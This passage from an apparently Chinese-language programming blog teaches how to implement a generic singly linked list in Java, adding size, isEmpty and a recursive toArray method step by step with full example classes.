class="built_in">this</span>.root.addNode(newNode);<span class="comment">//将新节点保存在合适的位置</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    4、在LinkImpl子类立面来返回数据的个数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>范例：数据统计</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链表数据增加</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ILink</span>&lt;E&gt; &#123; <span class="comment">//设置泛型避免安全隐患</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span>;<span class="comment">//增加节点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span>;<span class="comment">//获取数据个数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkImpl</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">ILink</span>&lt;E&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存节点的数据关系</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> E data; <span class="comment">//保存的数据</span></span><br><span class="line">        <span class="keyword">private</span> Node next; <span class="comment">//保存下一个引用</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//限制node必须有数据，有数据才有意义</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(E data)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.data = data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用：this = LinkImpl.root;</span></span><br><span class="line">        <span class="comment">//第二次调用：this = LinkImpl.root.next;</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addNode</span><span class="params">(Node newNode)</span> &#123; <span class="comment">//保存新的node数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.next = newNode;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.addNode(newNode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的成员----------</span></span><br><span class="line">    <span class="keyword">private</span> Node root; <span class="comment">//保存根元素</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;<span class="comment">//保存数据个数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的方法----------</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(e);<span class="comment">//创建一个新节点</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.root == <span class="literal">null</span>) &#123; <span class="comment">//现在没有根节点</span></span><br><span class="line">            <span class="built_in">this</span>.root = newNode; <span class="comment">//现在第一个节点作为根节点</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.root.addNode(newNode);<span class="comment">//将新节点保存在合适的位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test64</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ILink&lt;String&gt; all = <span class="keyword">new</span> <span class="title class_">LinkImpl</span>&lt;&gt;();</span><br><span class="line">        System.out.println(<span class="string">&quot;增加之前数据个数：&quot;</span> + all.size1());</span><br><span class="line">        all.add1(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;增加之后数据个数：&quot;</span> + all.size1());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    只是对于数据保存中的一个辅助功能。</p><h5 id="空集合判断"><a href="#空集合判断" class="headerlink" title="空集合判断"></a>空集合判断</h5><p>​    空集合判断：public boolean isEmpty()</p><p>​    链表里面可以保存有若干个数据，如果说现在链表还没有保存数据，则就表示是一个空集合，则应该提供有一个空的判断。</p><p>​    1、在ILink接口里面追加有判断方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>;<span class="comment">//判断空集合</span></span><br></pre></td></tr></table></figure><p>​    2、在LinkImpl子类里面覆写此方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//return this.root == null;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.count == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    使用根元素喝count==0是一样的</p><p>范例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链表数据增加</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ILink</span>&lt;E&gt; &#123; <span class="comment">//设置泛型避免安全隐患</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span>;<span class="comment">//增加节点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span>;<span class="comment">//获取数据个数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>;<span class="comment">//判断空集合</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkImpl</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">ILink</span>&lt;E&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存节点的数据关系</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> E data; <span class="comment">//保存的数据</span></span><br><span class="line">        <span class="keyword">private</span> Node next; <span class="comment">//保存下一个引用</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//限制node必须有数据，有数据才有意义</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(E data)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.data = data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用：this = LinkImpl.root;</span></span><br><span class="line">        <span class="comment">//第二次调用：this = LinkImpl.root.next;</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addNode</span><span class="params">(Node newNode)</span> &#123; <span class="comment">//保存新的node数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.next = newNode;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.addNode(newNode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的成员----------</span></span><br><span class="line">    <span class="keyword">private</span> Node root; <span class="comment">//保存根元素</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;<span class="comment">//保存数据个数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的方法----------</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(e);<span class="comment">//创建一个新节点</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.root == <span class="literal">null</span>) &#123; <span class="comment">//现在没有根节点</span></span><br><span class="line">            <span class="built_in">this</span>.root = newNode; <span class="comment">//现在第一个节点作为根节点</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.root.addNode(newNode);<span class="comment">//将新节点保存在合适的位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//return this.root == null;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test64</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ILink&lt;String&gt; all = <span class="keyword">new</span> <span class="title class_">LinkImpl</span>&lt;&gt;();</span><br><span class="line">        System.out.println(<span class="string">&quot;增加之前数据个数：&quot;</span> + all.size1() + <span class="string">&quot;、是否为空集合：&quot;</span> + all.isEmpty());</span><br><span class="line">        all.add1(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;增加之后数据个数：&quot;</span> + all.size1() + <span class="string">&quot;、是否为空集合：&quot;</span> + all.isEmpty());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="返回集合数据"><a href="#返回集合数据" class="headerlink" title="返回集合数据"></a>返回集合数据</h5><p>​    返回集合数据：public Object[] toArray()</p><p>​    链表本身就属于一个动态对象数组，那么既然是一个对象数组，就应该可以把所有的数据以数组的形式返回来，那么这个时候就可以定义一个toArray()的方法，但是这个时候的方法只能够返回Object型的数组。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073700.jpg"                      alt="image-20220802005625684"                ></p><p>​    1、在ILink接口里面追加新的处理方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object[] toArray();<span class="comment">//将集合元素以数组形式返回</span></span><br></pre></td></tr></table></figure><p>​    2、在LinkImpl子类里面追加有两个属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> foot;<span class="comment">//描述的是操作数组的脚标</span></span><br><span class="line"><span class="keyword">private</span> Object[] returnData;<span class="comment">//返回的数据保存</span></span><br></pre></td></tr></table></figure><p>​    3、在Node类中，根据递归获取数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">toArrayNode</span><span class="params">()</span> &#123;</span><br><span class="line">    LinkImpl.<span class="built_in">this</span>.returnData[LinkImpl.<span class="built_in">this</span>.foot++] = <span class="built_in">this</span>.data;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.next != <span class="literal">null</span>)&#123;<span class="comment">//还有下一个数据</span></span><br><span class="line">        <span class="built_in">this</span>.next.toArrayNode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    4、在进行数据返回的时候，一定要先判断是不是null集合</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object[] toArray() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;<span class="comment">//无数据</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//脚标清0</span></span><br><span class="line">    <span class="built_in">this</span>.returnData = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="built_in">this</span>.count];<span class="comment">//根据已有的长度开辟数组</span></span><br><span class="line">    <span class="built_in">this</span>.root.toArrayNode();<span class="comment">//利用Node类进行递归数据获取</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.returnData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>范例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链表数据增加</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ILink</span>&lt;E&gt; &#123; <span class="comment">//设置泛型避免安全隐患</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span>;<span class="comment">//增加节点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span>;<span class="comment">//获取数据个数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>;<span class="comment">//判断空集合</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray();<span class="comment">//将集合元素以数组形式返回</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkImpl</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">ILink</span>&lt;E&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存节点的数据关系</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> E data; <span class="comment">//保存的数据</span></span><br><span class="line">        <span class="keyword">private</span> Node next; <span class="comment">//保存下一个引用</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//限制node必须有数据，有数据才有意义</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(E data)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.data = data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用：this = LinkImpl.root;</span></span><br><span class="line">        <span class="comment">//第二次调用：this = LinkImpl.root.next;</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addNode</span><span class="params">(Node newNode)</span> &#123; <span class="comment">//保存新的node数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.next = newNode;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.addNode(newNode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用:this = LinkImpl.root</span></span><br><span class="line">        <span class="comment">//第二次调用:this = LinkImpl.root.next</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">toArrayNode</span><span class="params">()</span> &#123;</span><br><span class="line">            LinkImpl.<span class="built_in">this</span>.returnData[LinkImpl.<span class="built_in">this</span>.foot++] = <span class="built_in">this</span>.data;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next != <span class="literal">null</span>)&#123;<span class="comment">//还有下一个数据</span></span><br><span class="line">                <span class="built_in">this</span>.next.toArrayNode();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的成员----------</span></span><br><span class="line">    <span class="keyword">private</span> Node root; <span class="comment">//保存根元素</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;<span class="comment">//保存数据个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> foot;<span class="comment">//描述的是操作数组的脚标</span></span><br><span class="line">    <span class="keyword">private</span> Object[] returnData;<span class="comment">//返回的数据保存</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的方法----------</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(e);<span class="comment">//创建一个新节点</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.root == <span class="literal">null</span>) &#123; <span class="comment">//现在没有根节点</span></span><br><span class="line">            <span class="built_in">this</span>.root = newNode; <span class="comment">//现在第一个节点作为根节点</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.root.addNode(newNode);<span class="comment">//将新节点保存在合适的位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//return this.root == null;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;<span class="comment">//无数据</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//脚标清0</span></span><br><span class="line">        <span class="built_in">this</span>.returnData = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="built_in">this</span>.count];<span class="comment">//根据已有的长度开辟数组</span></span><br><span class="line">        <span class="built_in">this</span>.root.toArrayNode();<span class="comment">//利用Node类进行递归数据获取</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.returnData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test64</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ILink&lt;String&gt; all = <span class="keyword">new</span> <span class="title class_">LinkImpl</span>&lt;&gt;();</span><br><span class="line">        System.out.println(<span class="string">&quot;增加之前数据个数：&quot;</span> + all.size1() + <span class="string">&quot;、是否为空集合：&quot;</span> + all.isEmpty());</span><br><span class="line">        all.add1(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;增加之后数据个数：&quot;</span> + all.size1() + <span class="string">&quot;、是否为空集合：&quot;</span> + all.isEmpty());</span><br><span class="line">        Object[] result = all.toArray();</span><br><span class="line">        <span class="keyword">for</span> (Object obj : result)&#123;</span><br><span class="line">            System.out.println(obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 